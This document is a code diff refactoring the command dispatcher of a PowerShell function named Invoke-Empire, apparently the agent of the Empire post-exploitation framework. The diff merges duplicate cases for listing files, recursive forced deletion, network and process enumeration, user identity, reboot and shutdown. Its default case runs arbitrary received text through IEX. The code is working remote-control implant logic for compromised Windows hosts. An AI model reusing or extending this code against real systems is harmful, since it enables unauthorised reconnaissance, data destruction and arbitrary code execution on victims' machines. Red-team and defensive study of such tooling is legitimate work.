@@ -252,16 +252,8 @@ function Invoke-Empire {
         }
 
         $output = ""
-        switch ($cmd){
-            ls {
-                if ($cmdargs.length -eq ""){
-                    $output = Get-ChildItem -force | select lastwritetime,length,name
-                }
-                else {
-                    $output = Get-ChildItem -force -path $cmdargs | select lastwritetime,length,name
-                }
-            }
-            dir {
+        switch -regex ($cmd){
+            '(ls|dir)' {
                 if ($cmdargs.length -eq ""){
                     $output = Get-ChildItem -force | select lastwritetime,length,name
                 }
@@ -279,26 +271,15 @@ function Invoke-Empire {
                     }
                 }
             }
-            rm { 
+            '(rm|del|rmdir)' { 
                 if ($cmdargs.length -ne ""){ 
                     try {
-                        Remove-Item $cmdargs -ErrorAction Stop;
+                        Remove-Item -Force -Recurse $cmdargs -ErrorAction Stop;
                         $output = "$cmdargs deleted"
                     } 
                     catch {
                         $output=$_.Exception;
-                    } 
-                }
-            }
-            del { 
-                if ($cmdargs.length -ne ""){ 
-                    try {
-                        Remove-Item $cmdargs -ErrorAction Stop;
-                        $output = "$cmdargs deleted"
-                    } 
-                    catch {
-                        $output=$_.Exception;
-                    } 
+                    }
                 }
             }
             pwd { $output = pwd }
@@ -311,11 +292,10 @@ function Invoke-Empire {
                 }
             }
             mkdir { if ($cmdargs.length -ne ""){ $output = mkdir $cmdargs }}
-            rmdir { if ($cmdargs.length -ne ""){ $output = rmdir $cmdargs }}
             mv { if ($cmdargs.length -ne ""){ $output = mv $cmdargs }}
             arp { $output = arp -a }
             netstat { $output = netstat -a }
-            ipconfig {
+            '(ipconfig|ifconfig)' {
                 $output = Get-WmiObject -class "Win32_NetworkAdapterConfiguration" | ? {$_.IPEnabled -Match "True"} | % {
                     $out = New-Object psobject
                     $out | Add-Member Noteproperty 'Description' $_.Description
@@ -330,24 +310,8 @@ function Invoke-Empire {
                     $out
                 } | fl | Out-String | %{$_ + "`n"}
             }
-            ifconfig {
-                $output = Get-WmiObject -class "Win32_NetworkAdapterConfiguration" | ? {$_.IPEnabled -Match "True"} | % {
-                    $out = New-Object psobject
-                    $out | Add-Member Noteproperty 'Description' $_.Description
-                    $out | Add-Member Noteproperty 'MACAddress' $_.MACAddress
-                    $out | Add-Member Noteproperty 'DHCPEnabled' $_.DHCPEnabled
-                    $out | Add-Member Noteproperty 'IPAddress' $($_.IPAddress -join ",")
-                    $out | Add-Member Noteproperty 'IPSubnet' $($_.IPSubnet -join ",")
-                    $out | Add-Member Noteproperty 'DefaultIPGateway' $($_.DefaultIPGateway -join ",")
-                    $out | Add-Member Noteproperty 'DNSServer' $($_.DNSServerSearchOrder -join ",")
-                    $out | Add-Member Noteproperty 'DNSHostName' $_.DNSHostName
-                    $out | Add-Member Noteproperty 'DNSSuffix' $($_.DNSDomainSuffixSearchOrder -join ",")
-                    $out
-                } | fl | Out-String | %{$_ + "`n"}
-            }
-
             # this is stupid how complicated it is to get this information...
-            ps { 
+            '(ps|tasklist)' { 
                 $owners = @{}
                 gwmi win32_process | % {$o = $_.getowner(); if(-not $($o.User)){$o="N/A"} else {$o="$($o.Domain)\$($o.User)"}; $owners[$_.handle] = $o}
                 if($cmdargs -ne "") { $p = $cmdargs }
@@ -375,44 +339,13 @@ function Invoke-Empire {
                     $out
                 } | Sort-Object -Property PID
             }
-
-            tasklist { 
-                $owners = @{}
-                gwmi win32_process | % {$o = $_.getowner(); if(-not $($o.User)){$o="N/A"} else {$o="$($o.Domain)\$($o.User)"}; $owners[$_.handle] = $o}
-                if($cmdargs -ne "") { $p = $cmdargs }
-                else{ $p = "*" }
-                $output = Get-Process $p | % {
-                    $arch = "x64"
-                    if ([System.IntPtr]::Size -eq 4){
-                        $arch = "x86"
-                    }
-                    else{
-                        foreach($module in $_.modules) {
-                            if([System.IO.Path]::GetFileName($module.FileName).ToLower() -eq "wow64.dll") {
-                                $arch = "x86"
-                                break
-                            }
-                        }
-                    }
-                    $out = New-Object psobject
-                    $out | Add-Member Noteproperty 'ProcessName' $_.ProcessName
-                    $out | Add-Member Noteproperty 'PID' $_.ID
-                    $out | Add-Member Noteproperty 'Arch' $arch
-                    $out | Add-Member Noteproperty 'UserName' $owners[$_.id.tostring()]
-                    $mem = "{0:N2} MB" -f $($_.WS/1MB)
-                    $out | Add-Member Noteproperty 'MemUsage' $mem
-                    $out
-                } | Sort-Object -Property PID
-            }
-            getpid { $output = [System.Diagnostics.Process]::GetCurrentProcess() | ft -wrap }
+            getpid { $output = [System.Diagnostics.Process]::GetCurrentProcess() }
             route {
                 if ($cmdargs.length -eq ""){ $output = route print }
                 else { $output = route $cmdargs }
             }
-            whoami { [Security.Principal.WindowsIdentity]::GetCurrent().Name | Out-String }
-            getuid { [Security.Principal.WindowsIdentity]::GetCurrent().Name | Out-String }
-            reboot { Restart-Computer -force }
-            restart { Restart-Computer -force }
+            '(whoami|getuid)' { [Security.Principal.WindowsIdentity]::GetCurrent().Name }
+            '(reboot|restart)' { Restart-Computer -force }
             shutdown { Stop-Computer -force }
             default {
                 if ($cmdargs.length -eq ""){ $output = IEX $cmd }
